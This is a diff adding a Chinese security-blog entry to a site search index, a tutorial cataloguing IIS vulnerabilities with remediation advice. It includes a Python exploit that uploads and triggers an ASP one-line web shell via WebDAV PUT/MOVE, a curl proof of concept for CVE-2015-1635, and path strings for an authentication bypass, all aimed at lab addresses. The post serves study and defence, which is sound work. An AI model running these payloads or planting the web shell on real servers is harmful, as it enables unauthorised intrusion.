@@ -1,6 +1,149 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>中间件漏洞之IIS（记录）</title>
+    <url>/2020/04/03/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BIIS%EF%BC%88%E8%AE%B0%E5%BD%95%EF%BC%89/</url>
+    <content><![CDATA[<p>中间件IIS常见漏洞记录<a id="more"></a></p>
+<h1 id="中间件和IIS简介："><a href="#中间件和IIS简介：" class="headerlink" title="中间件和IIS简介："></a>中间件和IIS简介：</h1><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><blockquote>
+<p>中间件是一类连接软件组件和应用的计算机软件，它包括一组服务。以便于运行在一台或多台机器上的多个软件通过网络进行交互。</p>
+</blockquote>
+<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><blockquote>
+<p>是互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。</p>
+</blockquote>
+<blockquote>
+<p>IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
+</blockquote>
+<p><img src="https://i.imgur.com/Ez6miVp.png" alt=""></p>
+<h1 id="IIS常见漏洞整理："><a href="#IIS常见漏洞整理：" class="headerlink" title="IIS常见漏洞整理："></a>IIS常见漏洞整理：</h1><p><img src="https://i.imgur.com/EUNJrSy.png" alt=""></p>
+<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h3><p>1、默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析<br><img src="https://i.imgur.com/PlXlJmO.png" alt=""></p>
+<p>2、默认会将 *.asp/目录下的所有文件当成Asp解析<br><img src="https://i.imgur.com/0q5nUps.png" alt=""></p>
+<p>3、将扩展名为.asa，.cdx，.cer解析为asp<br><img src="https://i.imgur.com/egAugqC.png" alt=""></p>
+<p><em>修复建议：</em></p>
+<p>1、设置上传目录的执行权限，不允许执行脚本。</p>
+<p>2、对上传的文件进行随机重命名，并且去除文件名回显。</p>
+<h3 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h3><p><em>安装IIS7.5</em></p>
+<p>1、安装应用程序开发功能<br><img src="https://i.imgur.com/vZRkNTV.png" alt=""></p>
+<p>2、下载<a href="http://museum.php.net/php5/php-5.2.10-win32-installer.msi" target="_blank" rel="noopener">php-5.2.10-win32-installer.msi</a></p>
+<p>-&gt; 安装：一直下一步直到web server setup，选择选择IIS fastcgi</p>
+<p><img src="https://i.imgur.com/EEBjDks.png" alt=""></p>
+<p>3、编辑：ISAPI或者CGI限制</p>
+<p><img src="https://i.imgur.com/yL8oBRx.png" alt=""></p>
+<p>-&gt;添加</p>
+<p><img src="https://i.imgur.com/SVHPoDm.png" alt=""></p>
+<p>4、编辑：处理程序映射</p>
+<p><img src="https://i.imgur.com/6Ec0Ega.png" alt=""></p>
+<p>-&gt;添加</p>
+<p><img src="https://i.imgur.com/Chb4C5I.png" alt=""></p>
+<p>5、测试phpinfo</p>
+<p><img src="https://i.imgur.com/Qw4zTSH.png" alt=""></p>
+<p><em>利用：</em></p>
+<p>1、Fast-CGI运行模式下,在任意文件。</p>
+<p>例：test.jpg后面加上/.php，会将test.jpg 解析为php文件<br><img src="https://i.imgur.com/xMH6gRM.png" alt=""></p>
+<p><em>修复建议：</em></p>
+<p>1、修改php.ini</p>
+<pre><code>; cgi.fix_pathinfo=0
+//修改之前为：; cgi.fix_pathinfo=1</code></pre><h2 id="PUT任意文件写入"><a href="#PUT任意文件写入" class="headerlink" title="PUT任意文件写入"></a>PUT任意文件写入</h2><p>1、影响版本：6.x</p>
+<p>开启WebDAV和写权限</p>
+<p><img src="https://i.imgur.com/c7GAOr7.png" alt=""></p>
+<p><img src="https://i.imgur.com/fQsW7n3.png" alt=""></p>
+<p><img src="https://i.imgur.com/CqFbgQb.png" alt=""></p>
+<p><img src="https://i.imgur.com/LD0DNVf.png" alt=""></p>
+<p>2、EXP</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+#需要运行两次，第一次上传shell.txt。第二次用move方法。
+import requests
+
+# 分别需要put,move的url（在这里修改url）
+put_url = &apos;http://192.168.1.133/shell.txt&apos;
+move_url = &apos;http://192.168.1.133/shell.txt&apos;
+move_headers = {
+    &apos;Destination&apos;: &apos;http://192.168.1.133/shell.asp&apos;
+}
+# put的脚本（这里修改password）
+put_data = &apos;&lt;%execute(request(&quot;passwd&quot;))%&gt;&apos;
+post_data = {
+    &apos;apple&apos;: &apos;&apos;
+}
+try:
+    response = requests.request(&apos;PUT&apos;, url=put_url, data=put_data)
+    if response.status_code == 200:
+        response = requests.request(&apos;MOVE&apos;, url=move_url, headers=move_headers)
+        if response.status_code == 207:
+            response = requests.post(url=&apos;http://192.168.1.133/shell.asp&apos;, data=post_data)
+            print(response.content.decode(&quot;gb2312&quot;))
+        else:
+            print(response.status_code)
+except:
+    pass</code></pre><p><a href="https://www.codercto.com/a/48257.html" target="_blank" rel="noopener" title="https://www.codercto.com/a/48257.html">https://www.codercto.com/a/48257.html</a></p>
+<p><em>修复建议：</em></p>
+<p>关闭WebDAV 和 写权限</p>
+<h2 id="短文件漏洞"><a href="#短文件漏洞" class="headerlink" title="短文件漏洞"></a>短文件漏洞</h2><p>1、影响条件：NTFS 8.3支持开启</p>
+<p>原理：在cmd中输入 dir\x 查看短文件名，可以看到存在的文件返回404，不存在返回400</p>
+<p><img src="https://i.imgur.com/WocqQJp.png" alt=""></p>
+<p><img src="https://i.imgur.com/tsS1GEo.png" alt=""></p>
+<p>2、EXP：<a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener" title="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a></p>
+<p>3、参考：<br><a href="https://www.freebuf.com/news/197144.html" target="_blank" rel="noopener" title="https://www.freebuf.com/news/197144.html">https://www.freebuf.com/news/197144.html</a></p>
+<p><em>修复建议：</em></p>
+<pre><code>#1、关闭NTFS 8.3支持（1关闭，0开启）
+fsutil behavior set disable8dot3 1
+#2、修改注册表regedit
+找到路径HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，修改NtfsDisable8dot3NameCreation为1
+#重启系统生效</code></pre><h2 id="HTTP-sys远程代码执行（CVE-2015-1635）"><a href="#HTTP-sys远程代码执行（CVE-2015-1635）" class="headerlink" title="HTTP.sys远程代码执行（CVE-2015-1635）"></a>HTTP.sys远程代码执行（CVE-2015-1635）</h2><p>1、影响范围：<br>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</p>
+<p>2、POC:</p>
+<pre><code>curl http://192.168.1.144 -H &quot;Host: 192.168.1.144&quot; -H &quot;Range: bytes=0-18446744073709551615&quot;</code></pre><p><img src="https://i.imgur.com/KBgHuw6.png" alt=""></p>
+<p>2、MSF_POC：</p>
+<p><a href="https://www.cvedetails.com/cve/CVE-2015-1635/" target="_blank" rel="noopener" title="https://www.cvedetails.com/cve/CVE-2015-1635/">https://www.cvedetails.com/cve/CVE-2015-1635/</a></p>
+<p><img src="https://i.imgur.com/lEiChUW.png" alt=""></p>
+<p><img src="https://i.imgur.com/AzLmd9v.png" alt=""></p>
+<p><img src="https://i.imgur.com/Mtj15Zc.png" alt=""></p>
+<p>3、参考：</p>
+<p><a href="https://www.freebuf.com/vuls/64195.html" target="_blank" rel="noopener" title="https://www.freebuf.com/vuls/64195.html">https://www.freebuf.com/vuls/64195.html</a></p>
+<h2 id="远程代码执行（CVE-2017-7269）"><a href="#远程代码执行（CVE-2017-7269）" class="headerlink" title="远程代码执行（CVE-2017-7269）"></a>远程代码执行（CVE-2017-7269）</h2><p>1、影响范围：</p>
+<p>在Windows 2003 R2, Enterprise Edition Service Pack 2）上使用IIS 6.0并开启WebDAV扩展。</p>
+<p>2、EXP:</p>
+<p><a href="https://github.com/zcgonvh/cve-2017-7269" target="_blank" rel="noopener" title="https://github.com/zcgonvh/cve-2017-7269">https://github.com/zcgonvh/cve-2017-7269</a>（msf自带的只能适用于默认物理路径）</p>
+<p>在载入完上面的exp后，值得注意的是physicalpathlength的值</p>
+<p>例如：我的物理路径为C:\Inetpub\wwwroot\aspcms（需要加上\）长度就为26</p>
+<p><img src="https://i.imgur.com/iUrYGkH.png" alt=""></p>
+<p>3、参考：<br><a href="http://www.admintony.com/CVE-2017-7269.html" target="_blank" rel="noopener" title="http://www.admintony.com/CVE-2017-7269.html">http://www.admintony.com/CVE-2017-7269.html</a></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="CGI环境块伪造"><a href="#CGI环境块伪造" class="headerlink" title="CGI环境块伪造"></a>CGI环境块伪造</h3><p>1、影响版本：IIS4、IIS5 &amp;&amp;winnt、Win2000</p>
+<p>2、参考：<a href="https://www.freebuf.com/vuls/31444.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/31444.html</a></p>
+<h3 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h3><p>1、影响版本：IIS6.0、IIS7.5</p>
+<p>2、漏洞详情：对用户输入未经正确验证，攻击者可利用漏洞构造特殊数据，在服务器进程上下文中获取密码保护资源和查看源代码文件的未授权访问</p>
+<p>3、攻击手段：</p>
+<p>IIS6.0:<br>将::$INDEX_ALLOCATION后缀添加到目录名称后，如/admin::$INDEX_ALLOCATION/index.php</p>
+<p>IIS7.5:<br>将:$i30:$INDEX_ALLOCATION后缀添加到目录名称后，如/admin:$i30:$INDEX_ALLOCATION/index.asp</p>
+<h3 id="FTPd服务MLST命令栈缓冲区溢出漏洞"><a href="#FTPd服务MLST命令栈缓冲区溢出漏洞" class="headerlink" title="FTPd服务MLST命令栈缓冲区溢出漏洞"></a>FTPd服务MLST命令栈缓冲区溢出漏洞</h3><p>1、MSF_POC</p>
+<ul>
+<li>MS09-053/CVE-2009-3023</li>
+</ul>
+<h3 id="拒绝服务漏洞"><a href="#拒绝服务漏洞" class="headerlink" title="拒绝服务漏洞"></a>拒绝服务漏洞</h3><ul>
+<li><p>CVE-2019-0941</p>
+</li>
+<li><p>CVE-2019-9512</p>
+</li>
+<li><p>等等……</p>
+</li>
+</ul>
+<h2 id="尾巴："><a href="#尾巴：" class="headerlink" title="尾巴："></a>尾巴：</h2><p>在收集完IIS的漏洞之后，感觉都很简单，但是发现实际复现的时候还是遇到了一些状况特别是CVE-2017-7269，在复现的过程中就因为系统的版本、以及EXP本身的问题，这个漏洞有很多EXP但是，并不是每个版本都可以利用成功，有一些细微差别。总体，虽然都是一些比较旧的漏洞，也很难遇到，但是还是有一些收获。</p>
+<hr>
+<p><strong>声明：</strong></p>
+<ul>
+<li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
+</li>
+<li><p>本文属于<a href="https://aqyoung.github.io/" target="_blank" rel="noopener" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>中间件</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>绕过CDN查找真实IP方法总结</title>
     <url>/2020/03/30/CDN_bypass1/</url>
     <content><![CDATA[<p>绕过CDN查找真实IP地址的总结文章<a id="more"></a></p>
